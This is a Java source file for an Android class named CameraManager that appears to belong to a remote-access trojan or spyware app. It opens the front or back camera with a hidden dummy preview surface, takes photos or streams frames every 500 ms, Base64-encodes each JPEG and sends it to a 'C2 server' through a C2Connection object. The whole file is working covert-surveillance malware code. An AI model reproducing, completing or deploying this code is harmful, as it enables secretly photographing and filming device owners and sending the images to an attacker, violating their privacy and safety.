package com.tarjon.admin.utils;

import android.Manifest;
import android.app.Activity;
import android.content.Context;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.ImageFormat;
import android.graphics.Matrix;
import android.graphics.SurfaceTexture;
import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraCaptureSession;
import android.hardware.camera2.CameraCharacteristics;
import android.hardware.camera2.CameraDevice;
import android.hardware.camera2.CameraManager.AvailabilityCallback;
import android.hardware.camera2.CameraMetadata;
import android.hardware.camera2.CaptureRequest;
import android.hardware.camera2.params.StreamConfigurationMap;
import android.media.Image;
import android.media.ImageReader;
import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;
import android.util.Base64;
import android.util.Log;
import android.util.Size;
import android.view.Surface;

import androidx.annotation.NonNull;
import androidx.annotation.RequiresApi;
import androidx.core.app.ActivityCompat;

import com.tarjon.admin.network.C2Connection;

import java.io.ByteArrayOutputStream;
import java.nio.ByteBuffer;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collections;
import java.util.Comparator;
import java.util.List;
import java.util.concurrent.Semaphore;
import java.util.concurrent.TimeUnit;

/**
 * Manages camera access for both front and rear cameras
 * Supports photo capture and streaming
 */
@RequiresApi(api = Build.VERSION_CODES.LOLLIPOP)
public class CameraManager {
    private static final String TAG = "CameraManager";
    
    // Camera selection
    public static final int CAMERA_BACK = 0;
    public static final int CAMERA_FRONT = 1;
    
    // Image quality and size
    private static final int DEFAULT_JPEG_QUALITY = 80;
    private static final int DEFAULT_WIDTH = 1280;
    private static final int DEFAULT_HEIGHT = 720;
    
    private final Context context;
    private android.hardware.camera2.CameraManager cameraManager;
    private final C2Connection c2Connection;
    
    // Camera state
    private String currentCameraId;
    private CameraDevice cameraDevice;
    private CameraCaptureSession captureSession;
    private ImageReader imageReader;
    private HandlerThread backgroundThread;
    private Handler backgroundHandler;
    private Semaphore cameraOpenCloseLock = new Semaphore(1);
    private boolean isStreaming = false;
    
    // Capture settings
    private int jpegQuality = DEFAULT_JPEG_QUALITY;
    private int imageWidth = DEFAULT_WIDTH;
    private int imageHeight = DEFAULT_HEIGHT;
    
    // Streaming
    private static final int STREAMING_INTERVAL_MS = 500; // Default: 2 FPS
    private Handler streamingHandler;
    private HandlerThread streamingThread;
    
    // Callback for image availability
    private final ImageReader.OnImageAvailableListener onImageAvailableListener = 
            new ImageReader.OnImageAvailableListener() {
        @Override
        public void onImageAvailable(ImageReader reader) {
            Image image = null;
            try {
                image = reader.acquireLatestImage();
                if (image == null) {
                    return;
                }
                
                // Process the captured JPEG
                ByteBuffer buffer = image.getPlanes()[0].getBuffer();
                byte[] bytes = new byte[buffer.capacity()];
                buffer.get(bytes);
                
                // Convert to Base64
                String base64Image = Base64.encodeToString(bytes, Base64.DEFAULT);
                
                // Send to C2 server
                if (c2Connection != null) {
                    c2Connection.sendCameraImage(base64Image, 
                            currentCameraId.equals(getFrontCameraId()) ? "front" : "back");
                }
                
            } catch (Exception e) {
                Log.e(TAG, "Error processing camera image: " + e.getMessage());
            } finally {
                if (image != null) {
                    image.close();
                }
            }
        }
    };
    
    // Camera device state callback
    private final CameraDevice.StateCallback stateCallback = new CameraDevice.StateCallback() {
        @Override
        public void onOpened(@NonNull CameraDevice camera) {
            cameraOpenCloseLock.release();
            cameraDevice = camera;
            createCameraPreviewSession();
        }
        
        @Override
        public void onDisconnected(@NonNull CameraDevice camera) {
            cameraOpenCloseLock.release();
            camera.close();
            cameraDevice = null;
        }
        
        @Override
        public void onError(@NonNull CameraDevice camera, int error) {
            cameraOpenCloseLock.release();
            camera.close();
            cameraDevice = null;
            
            Log.e(TAG, "Camera device error: " + error);
        }
    };
    
    public CameraManager(Context context, C2Connection c2Connection) {
        this.context = context;
        this.c2Connection = c2Connection;
        
        // Initialize camera service
        cameraManager = (android.hardware.camera2.CameraManager) 
                context.getSystemService(Context.CAMERA_SERVICE);
    }
    
    /**
     * Set image quality parameters
     * @param quality JPEG quality (1-100)
     * @param width Image width
     * @param height Image height
     */
    public void setImageQuality(int quality, int width, int height) {
        this.jpegQuality = Math.min(100, Math.max(1, quality));
        this.imageWidth = width > 0 ? width : DEFAULT_WIDTH;
        this.imageHeight = height > 0 ? height : DEFAULT_HEIGHT;
    }
    
    /**
     * Start camera with specified facing
     * @param facing CAMERA_BACK or CAMERA_FRONT
     * @return true if camera started successfully
     */
    public boolean startCamera(int facing) {
        String cameraId = (facing == CAMERA_FRONT) ? 
                getFrontCameraId() : getBackCameraId();
                
        if (cameraId == null) {
            Log.e(TAG, "Camera with specified facing not found");
            return false;
        }
        
        return openCamera(cameraId);
    }
    
    /**
     * Take a single photo
     * @return true if capture request was sent
     */
    public boolean takePicture() {
        if (cameraDevice == null || captureSession == null) {
            Log.e(TAG, "Cannot take picture, camera not initialized");
            return false;
        }
        
        try {
            // Create a capture request for still image
            final CaptureRequest.Builder captureBuilder = 
                    cameraDevice.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
            captureBuilder.addTarget(imageReader.getSurface());
            
            // Set auto-focus mode
            captureBuilder.set(CaptureRequest.CONTROL_AF_MODE,
                    CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE);
            
            // Set orientation
            int rotation = getJpegOrientation();
            captureBuilder.set(CaptureRequest.JPEG_ORIENTATION, rotation);
            
            // Set quality
            captureBuilder.set(CaptureRequest.JPEG_QUALITY, (byte) jpegQuality);
            
            // Capture the image
            captureSession.stopRepeating();
            captureSession.capture(captureBuilder.build(), null, backgroundHandler);
            
            return true;
        } catch (CameraAccessException e) {
            Log.e(TAG, "Error taking picture: " + e.getMessage());
            return false;
        }
    }
    
    /**
     * Start continuous camera streaming
     * @param intervalMs Milliseconds between frames
     * @return true if streaming started successfully
     */
    public boolean startStreaming(long intervalMs) {
        if (cameraDevice == null || captureSession == null) {
            Log.e(TAG, "Cannot start streaming, camera not initialized");
            return false;
        }
        
        if (isStreaming) {
            stopStreaming();
        }
        
        // Start streaming thread
        streamingThread = new HandlerThread("CameraStreaming");
        streamingThread.start();
        streamingHandler = new Handler(streamingThread.getLooper());
        
        // Create streaming runnable
        final Runnable streamingRunnable = new Runnable() {
            @Override
            public void run() {
                if (cameraDevice == null || captureSession == null || !isStreaming) {
                    return;
                }
                
                try {
                    // Create a capture request for still image
                    final CaptureRequest.Builder captureBuilder = 
                            cameraDevice.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
                    captureBuilder.addTarget(imageReader.getSurface());
                    
                    // Set auto-focus mode
                    captureBuilder.set(CaptureRequest.CONTROL_AF_MODE,
                            CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE);
                    
                    // Set orientation
                    int rotation = getJpegOrientation();
                    captureBuilder.set(CaptureRequest.JPEG_ORIENTATION, rotation);
                    
                    // Set quality
                    captureBuilder.set(CaptureRequest.JPEG_QUALITY, (byte) jpegQuality);
                    
                    // Capture the image
                    captureSession.capture(captureBuilder.build(), null, backgroundHandler);
                    
                    // Schedule next capture if still streaming
                    if (isStreaming) {
                        streamingHandler.postDelayed(this, intervalMs);
                    }
                } catch (CameraAccessException e) {
                    Log.e(TAG, "Error in camera streaming: " + e.getMessage());
                    stopStreaming();
                }
            }
        };
        
        // Start streaming
        isStreaming = true;
        streamingHandler.post(streamingRunnable);
        
        return true;
    }
    
    /**
     * Stop continuous camera streaming
     */
    public void stopStreaming() {
        isStreaming = false;
        
        if (streamingHandler != null && streamingThread != null) {
            streamingHandler.removeCallbacksAndMessages(null);
            streamingThread.quitSafely();
            try {
                streamingThread.join();
                streamingThread = null;
                streamingHandler = null;
            } catch (InterruptedException e) {
                Log.e(TAG, "Error stopping streaming thread: " + e.getMessage());
            }
        }
    }
    
    /**
     * Switch between front and back camera
     * @return true if switched successfully
     */
    public boolean switchCamera() {
        if (cameraDevice == null) {
            return false;
        }
        
        String currentId = currentCameraId;
        closeCamera();
        
        // If current was front, switch to back, and vice versa
        if (currentId.equals(getFrontCameraId())) {
            return startCamera(CAMERA_BACK);
        } else {
            return startCamera(CAMERA_FRONT);
        }
    }
    
    /**
     * Stop camera and release resources
     */
    public void release() {
        stopStreaming();
        closeCamera();
        
        if (backgroundThread != null) {
            backgroundThread.quitSafely();
            try {
                backgroundThread.join();
                backgroundThread = null;
                backgroundHandler = null;
            } catch (InterruptedException e) {
                Log.e(TAG, "Error stopping background thread: " + e.getMessage());
            }
        }
    }
    
    /**
     * Start background thread
     */
    private void startBackgroundThread() {
        backgroundThread = new HandlerThread("CameraBackground");
        backgroundThread.start();
        backgroundHandler = new Handler(backgroundThread.getLooper());
    }
    
    /**
     * Open camera with specified ID
     */
    private boolean openCamera(String cameraId) {
        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.CAMERA) 
                != PackageManager.PERMISSION_GRANTED) {
            Log.e(TAG, "Camera permission not granted");
            return false;
        }
        
        try {
            // Check if we can acquire the camera
            if (!cameraOpenCloseLock.tryAcquire(2500, TimeUnit.MILLISECONDS)) {
                Log.e(TAG, "Timeout waiting for camera lock");
                return false;
            }
            
            // Store camera ID
            currentCameraId = cameraId;
            
            // Get optimal size for image reader
            Size optimalSize = getOptimalSize(cameraId);
            
            // Create image reader for JPEG capture
            imageReader = ImageReader.newInstance(
                    optimalSize.getWidth(), optimalSize.getHeight(),
                    ImageFormat.JPEG, 2);
                    
            imageReader.setOnImageAvailableListener(onImageAvailableListener, backgroundHandler);
            
            // Start background thread
            startBackgroundThread();
            
            // Open camera
            cameraManager.openCamera(cameraId, stateCallback, backgroundHandler);
            
            return true;
        } catch (InterruptedException e) {
            Log.e(TAG, "Interrupted while opening camera: " + e.getMessage());
            return false;
        } catch (CameraAccessException e) {
            Log.e(TAG, "Error accessing camera: " + e.getMessage());
            return false;
        }
    }
    
    /**
     * Create camera preview session for image capture
     */
    private void createCameraPreviewSession() {
        try {
            // Create a dummy surface texture since we don't need a preview
            SurfaceTexture dummyTexture = new SurfaceTexture(1);
            dummyTexture.setDefaultBufferSize(imageWidth, imageHeight);
            Surface dummySurface = new Surface(dummyTexture);
            
            // Create capture session
            cameraDevice.createCaptureSession(
                    Arrays.asList(dummySurface, imageReader.getSurface()),
                    new CameraCaptureSession.StateCallback() {
                        @Override
                        public void onConfigured(@NonNull CameraCaptureSession session) {
                            if (cameraDevice == null) {
                                return;
                            }
                            
                            captureSession = session;
                            try {
                                // Create capture request builder for preview
                                CaptureRequest.Builder previewBuilder = 
                                        cameraDevice.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW);
                                previewBuilder.addTarget(dummySurface);
                                
                                // Start the preview
                                captureSession.setRepeatingRequest(
                                        previewBuilder.build(), null, backgroundHandler);
                                
                            } catch (CameraAccessException e) {
                                Log.e(TAG, "Error creating preview: " + e.getMessage());
                            }
                        }
                        
                        @Override
                        public void onConfigureFailed(@NonNull CameraCaptureSession session) {
                            Log.e(TAG, "Camera session configuration failed");
                        }
                    }, backgroundHandler);
                    
        } catch (CameraAccessException e) {
            Log.e(TAG, "Error creating capture session: " + e.getMessage());
        }
    }
    
    /**
     * Close camera and release resources
     */
    private void closeCamera() {
        try {
            cameraOpenCloseLock.acquire();
            
            if (captureSession != null) {
                captureSession.close();
                captureSession = null;
            }
            
            if (cameraDevice != null) {
                cameraDevice.close();
                cameraDevice = null;
            }
            
            if (imageReader != null) {
                imageReader.close();
                imageReader = null;
            }
            
        } catch (InterruptedException e) {
            Log.e(TAG, "Interrupted while closing camera: " + e.getMessage());
        } finally {
            cameraOpenCloseLock.release();
        }
    }
    
    /**
     * Get ID of the front camera
     */
    private String getFrontCameraId() {
        try {
            for (String cameraId : cameraManager.getCameraIdList()) {
                CameraCharacteristics characteristics = 
                        cameraManager.getCameraCharacteristics(cameraId);
                Integer facing = characteristics.get(CameraCharacteristics.LENS_FACING);
                
                if (facing != null && facing == CameraCharacteristics.LENS_FACING_FRONT) {
                    return cameraId;
                }
            }
        } catch (CameraAccessException e) {
            Log.e(TAG, "Error accessing camera: " + e.getMessage());
        }
        
        return null;
    }
    
    /**
     * Get ID of the back camera
     */
    private String getBackCameraId() {
        try {
            for (String cameraId : cameraManager.getCameraIdList()) {
                CameraCharacteristics characteristics = 
                        cameraManager.getCameraCharacteristics(cameraId);
                Integer facing = characteristics.get(CameraCharacteristics.LENS_FACING);
                
                if (facing != null && facing == CameraCharacteristics.LENS_FACING_BACK) {
                    return cameraId;
                }
            }
        } catch (CameraAccessException e) {
            Log.e(TAG, "Error accessing camera: " + e.getMessage());
        }
        
        return null;
    }
    
    /**
     * Get optimal size for image capture
     */
    private Size getOptimalSize(String cameraId) {
        try {
            CameraCharacteristics characteristics = 
                    cameraManager.getCameraCharacteristics(cameraId);
            StreamConfigurationMap map = characteristics.get(
                    CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP);
                    
            if (map == null) {
                return new Size(imageWidth, imageHeight);
            }
            
            // Get available JPEG sizes
            Size[] availableSizes = map.getOutputSizes(ImageFormat.JPEG);
            
            // Find the largest size that's less than or equal to our target size
            for (Size size : availableSizes) {
                if (size.getWidth() <= imageWidth && size.getHeight() <= imageHeight) {
                    return size;
                }
            }
            
            // If no suitable size found, return the smallest available
            return Collections.min(
                    Arrays.asList(availableSizes),
                    new Comparator<Size>() {
                        @Override
                        public int compare(Size lhs, Size rhs) {
                            return Long.signum((long) lhs.getWidth() * lhs.getHeight() -
                                    (long) rhs.getWidth() * rhs.getHeight());
                        }
                    });
                    
        } catch (CameraAccessException e) {
            Log.e(TAG, "Error accessing camera: " + e.getMessage());
            return new Size(imageWidth, imageHeight);
        }
    }
    
    /**
     * Get the proper JPEG orientation based on device rotation
     */
    private int getJpegOrientation() {
        try {
            CameraCharacteristics characteristics = 
                    cameraManager.getCameraCharacteristics(currentCameraId);
                    
            Integer sensorOrientation = 
                    characteristics.get(CameraCharacteristics.SENSOR_ORIENTATION);
                    
            // Default to 90 degrees if sensor orientation not available
            return sensorOrientation != null ? sensorOrientation : 90;
        } catch (CameraAccessException e) {
            Log.e(TAG, "Error accessing camera characteristics: " + e.getMessage());
            return 90;
        }
    }
    
    /**
     * Check if device has a front camera
     */
    public boolean hasFrontCamera() {
        return getFrontCameraId() != null;
    }
    
    /**
     * Check if device has a back camera
     */
    public boolean hasBackCamera() {
        return getBackCameraId() != null;
    }
}